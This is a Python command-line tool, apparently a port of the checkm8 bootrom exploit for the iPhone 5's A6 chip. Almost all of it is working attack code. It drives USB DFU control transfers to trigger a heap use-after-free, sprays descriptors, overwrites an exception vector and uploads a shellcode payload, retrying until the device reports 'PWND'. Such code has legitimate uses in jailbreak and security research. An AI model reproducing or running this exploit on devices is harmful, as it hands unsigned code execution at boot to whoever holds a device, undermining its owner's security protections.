"""
checkm8_1337.py - checkm8 exploit for Apple A6 (s5l8950x / iPhone 5)
"""

import argparse
import struct
import time
from pathlib import Path
from typing import Optional

import usb1  # python3 -m pip install libusb1

# -- constants --

APPLE_VID           = 0x05AC
DFU_PID             = 0x1227
DFU_MAX_TRANSFER_SZ = 0x800   # 2048 bytes
EP0_MAX_PACKET_SZ   = 0x40    # 64 bytes

# Payload flags (same bit positions as C source)
FLAG_REMAP_ROM   = 1 << 0
FLAG_DEMOTION    = 1 << 1
FLAG_USB_HANDLER = 1 << 2

# Marker embedded in the payload for flag patching
_PWND_MARKER = b" FLAG:0000 PWND:[meowing]"

# -- payload --

def _load_payload() -> bytes:
    here = Path(__file__).parent
    path = here / "shellcode" / "payload.bin"
    return path.read_bytes()


# -- serial / device info --

def _tag_value(serial: str, tag: str) -> Optional[str]:
    """Extract the value after *tag* in an Apple DFU serial string."""
    idx = serial.find(tag)
    if idx < 0:
        return None
    rest = serial[idx + len(tag):]
    if rest.startswith("["):
        end = rest.find("]")
        return rest[1:end] if end >= 0 else rest[1:]
    # Plain hex value, e.g. CPID:8950
    return rest.split()[0] if rest else None


def parse_serial(serial: str) -> dict:
    def hexval(tag: str) -> int:
        v = _tag_value(serial, tag)
        return int(v, 16) if v else 0

    return {
        "cpid": hexval("CPID:"),
        "cprv": hexval("CPRV:"),
        "bdid": hexval("BDID:"),
        "pwnd": _tag_value(serial, "PWND:"),
        "srtg": _tag_value(serial, "SRTG:"),
    }


# -- USB client --

class DFUClient:
    """Thin wrapper around a libusb1 handle for an Apple DFU device."""

    def __init__(self, ctx: usb1.USBContext,
                 handle: usb1.USBDeviceHandle,
                 serial: str) -> None:
        self._ctx    = ctx
        self._handle = handle
        self.serial  = serial
        self.info    = parse_serial(serial)

    # -- low-level transfers --------------------------------------------------

    def ctrl(self,
             bm_request_type: int,
             b_request:       int,
             w_value:         int,
             w_index:         int,
             data_or_length:  bytes | bytearray | int,
             timeout_ms:      int = 0) -> bytes:
        """Synchronous control transfer; returns received bytes (IN) or b'' (OUT)."""
        is_in = bool(bm_request_type & 0x80)
        if is_in:
            length = (data_or_length
                      if isinstance(data_or_length, int)
                      else len(data_or_length))
            return bytes(self._handle.controlRead(
                bm_request_type, b_request, w_value, w_index,
                length, timeout_ms,
            ))
        else:
            data = (data_or_length
                    if isinstance(data_or_length, (bytes, bytearray))
                    else bytes(data_or_length))
            self._handle.controlWrite(
                bm_request_type, b_request, w_value, w_index,
                data, timeout_ms,
            )
            return b""

    def async_ctrl_cancel(self,
                          bm_request_type: int,
                          b_request:       int,
                          w_value:         int,
                          w_index:         int,
                          data_or_length:  bytes | int,
                          cancel_after_ns: int) -> int:
        """
        Submit an async control transfer, cancel it after *cancel_after_ns*
        nanoseconds, wait for completion, and return the actual transfer length.
        """
        is_in = bool(bm_request_type & 0x80)
        if is_in:
            buf = bytearray(
                data_or_length
                if isinstance(data_or_length, int)
                else len(data_or_length)
            )
        else:
            buf = (bytearray(data_or_length)
                   if isinstance(data_or_length, (bytes, bytearray))
                   else bytearray(data_or_length))

        completed = [False]
        actual    = [0]

        def _callback(transfer: usb1.USBTransfer) -> None:
            actual[0]    = transfer.getActualLength()
            completed[0] = True

        transfer = self._handle.getTransfer()
        transfer.setControl(
            bm_request_type, b_request, w_value, w_index, buf,
            callback=_callback, timeout=0,
        )
        transfer.submit()

        time.sleep(cancel_after_ns * 1e-9)

        try:
            transfer.cancel()
        except usb1.USBError:
            pass  # already completed before we could cancel (USBErrorNotFound)

        while not completed[0]:
            self._ctx.handleEvents()

        return actual[0]

    def reset_and_close(self) -> None:
        try:
            self._handle.resetDevice()
        except usb1.USBError:
            pass
        try:
            self._handle.releaseInterface(0)
        except usb1.USBError:
            pass
        self._handle.close()  # type: ignore[no-untyped-call]


# -- device discovery --

def _try_open_dfu(ctx: usb1.USBContext) -> Optional[DFUClient]:
    handle = ctx.openByVendorIDAndProductID(APPLE_VID, DFU_PID)
    if handle is None:
        return None

    handle.setAutoDetachKernelDriver(True)
    try:
        handle.setConfiguration(1)
    except usb1.USBError:  # USBErrorBusy: config already set
        pass
    handle.claimInterface(0)

    # Try reading the serial number from the standard string descriptor.
    dev  = handle.getDevice()
    desc = dev.device_descriptor
    serial: str = ""
    if desc.iSerialNumber:
        try:
            serial = handle.getASCIIStringDescriptor(desc.iSerialNumber) or ""
        except usb1.USBError:
            pass

    # Fallback for older firmware that doesn't expose the serial via iSerial:
    # try string indices 4 and 3. getStringDescriptor already returns a decoded str.
    if "CPID:" not in serial:
        for idx in (4, 3):
            try:
                s: str | None = handle.getStringDescriptor(idx, 0x040A)
                if s and "CPID:" in s:
                    serial = s.rstrip("\x00")
                    break
            except usb1.USBError:
                continue

    return DFUClient(ctx, handle, serial)


def wait_for_dfu(ctx: usb1.USBContext, announce: bool = True) -> DFUClient:
    if announce:
        print("[*] Waiting for DFU device...")
    while True:
        dev = _try_open_dfu(ctx)
        if dev is not None:
            return dev
        time.sleep(1)


# -- payload patching --

def patch_payload(payload: bytearray, flag: int) -> None:
    """Patch the flag word and PWND marker in *payload* in-place."""
    # Offset 0x300: uint16 flag word used by the payload at runtime
    struct.pack_into("<H", payload, 0x300, flag)

    # Patch the ASCII flag field inside the embedded PWND string
    idx = payload.find(_PWND_MARKER)
    if idx >= 0:
        # " FLAG:XXXX PWND:..." - XXXX starts at offset +6
        payload[idx + 6 : idx + 10] = f"{flag:04x}".encode()


# -- exploit --

def _ctrl_noerr(dev: DFUClient, *args, **kwargs) -> bytes:
    """ctrl() that silently swallows USB errors."""
    try:
        return dev.ctrl(*args, **kwargs)
    except usb1.USBError:
        return b""


def _exploit_and_upload(ctx: usb1.USBContext,
                        payload: bytes,
                        debug: bool = False) -> DFUClient:
    """
    Run one full checkm8 attempt on whatever DFU device is currently attached.

    Returns the reconnected DFUClient after payload upload; the caller checks
    whether PWND appears in the serial string.
    """
    dev = wait_for_dfu(ctx, announce=False)
    print(f"[*] Device: {dev.serial!r}")

    blank = bytes(DFU_MAX_TRANSFER_SZ)

    # -- Phase 1: trigger heap use-after-free via short USB transfer --
    print("[*] Phase 1: heap setup")
    _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, blank, 100)

    push    = 0x7C0   # target: trigger short-transfer at exactly this offset
    retries = 0

    while True:
        sent = dev.async_ctrl_cancel(
            0x21, 1, 0x0000, 0x0000, bytes(push + EP0_MAX_PACKET_SZ),
            cancel_after_ns=1_000_000,   # 1 ms
        )
        if debug:
            print(f"[d]   async DNLOAD sent=0x{sent:x}")

        if sent >= push:
            # Transfer completed without short-packet - retry
            retries += 1
            time.sleep(0.01)
            _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, bytes(EP0_MAX_PACKET_SZ), 100)
            time.sleep(0.01)
            continue

        size = push - sent
        try:
            dev.ctrl(0x00, 0x00, 0x0000, 0x0000, bytes(size), 100)
        except usb1.USBError:
            break   # EP0 stalled (USBErrorPipe) or other error - move on

        # Not stalled yet; keep trying
        retries += 1
        time.sleep(0.01)
        _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, bytes(EP0_MAX_PACKET_SZ), 100)
        time.sleep(0.01)

    if debug:
        print(f"[d] Phase 1 done after {retries} retries")

    # -- Phase 2: corrupt the freed allocation via string-descriptor spray --
    print("[*] Phase 2: heap spray")
    _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, b"", 100)          # zero-len DNLOAD
    _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)             # GET_STATUS
    _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)             # GET_STATUS

    while True:
        sent = dev.async_ctrl_cancel(
            0x80, 6, 0x0304, 0x040A, 128,
            cancel_after_ns=100,   # 100 ns
        )
        if debug:
            print(f"[d]   spray sent=0x{sent:x}")
        timed_out = False
        try:
            dev.ctrl(0x80, 6, 0x0304, 0x040A, 64, 1)
        except usb1.USBError:
            timed_out = True

        if sent != 128 and timed_out:
            break

    # Clear EP0 stall twice
    _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)
    _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)

    # Trigger the overwrite by reading past the end of the descriptor
    _ctrl_noerr(dev, 0x80, 8, 0x0000, 0x0000, 129, 100)

    time.sleep(0.5)

    # -- Reconnect after phase 2 --
    print("[*] Reconnecting (post-phase-2)...")
    dev.reset_and_close()
    dev = wait_for_dfu(ctx, announce=False)

    time.sleep(0.1)

    # -- Phase 3: overwrite exception vector then upload payload --
    print("[*] Phase 3: vector overwrite + payload upload")

    # Exception vector table entry [5] = 0x10000000 triggers exec
    overwrite = bytearray(4 * 7)
    struct.pack_into("<I", overwrite, 5 * 4, 0x10000000)

    _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)   # CLEAR_FEATURE x2
    _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)
    _ctrl_noerr(dev, 0x00, 0x00, 0x0000, 0x0000, bytes(overwrite), 100)

    # Upload payload in DFU_MAX_TRANSFER_SZ chunks (DFU DNLOAD)
    offset = 0
    while offset < len(payload):
        chunk = payload[offset : offset + DFU_MAX_TRANSFER_SZ]
        _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, bytes(chunk), 100)
        offset += len(chunk)

    _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, b"", 100)   # zero-len DNLOAD
    _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)     # GET_STATUS
    _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)     # GET_STATUS

    time.sleep(1.0)

    # -- Final reconnect --
    print("[*] Reconnecting (post-upload)...")
    dev.reset_and_close()
    return wait_for_dfu(ctx, announce=False)


def run_exploit(flag: int = FLAG_REMAP_ROM | FLAG_USB_HANDLER,
                debug: bool = False) -> None:
    payload_bin = _load_payload()

    payload = bytearray(payload_bin)
    patch_payload(payload, flag)

    with usb1.USBContext() as ctx:
        print("[*] Waiting for DFU device...")
        dev = wait_for_dfu(ctx, announce=False)
        print(f"[+] Found: CPID=0x{dev.info['cpid']:04x}  serial={dev.serial!r}")
        dev.reset_and_close()   # close; _exploit_and_upload will reopen

        attempt = 0
        while True:
            attempt += 1
            print(f"\n[*] Exploit attempt {attempt}")
            try:
                dev = _exploit_and_upload(ctx, bytes(payload), debug=debug)
            except Exception as exc:
                print(f"[!] Error during attempt {attempt}: {exc}")
                time.sleep(2)
                continue

            info = parse_serial(dev.serial)
            if info.get("pwnd"):
                print(f"[+] Success on attempt {attempt}! "
                      f"PWND:[{info['pwnd']}]  serial={dev.serial!r}")
                dev.reset_and_close()
                return

            print(f"[*] Not pwned (serial={dev.serial!r}), retrying...")
            dev.reset_and_close()
            time.sleep(1)


# -- CLI --

def main() -> None:
    parser = argparse.ArgumentParser(
        description="checkm8 exploit for Apple A6 / s5l8950x (Python port of a6meowing, based on checkra1n 1337 version)",
    )
    parser.add_argument(
        "--no-handler", action="store_true",
        help="Don't install the USB 0xA1/2 handler (skip FLAG_USB_HANDLER)",
    )
    parser.add_argument(
        "--debug", "-d", action="store_true",
        help="Print verbose transfer info",
    )
    args = parser.parse_args()

    flag = FLAG_REMAP_ROM
    if not args.no_handler:
        flag |= FLAG_USB_HANDLER

    run_exploit(flag=flag, debug=args.debug)


if __name__ == "__main__":
    main()
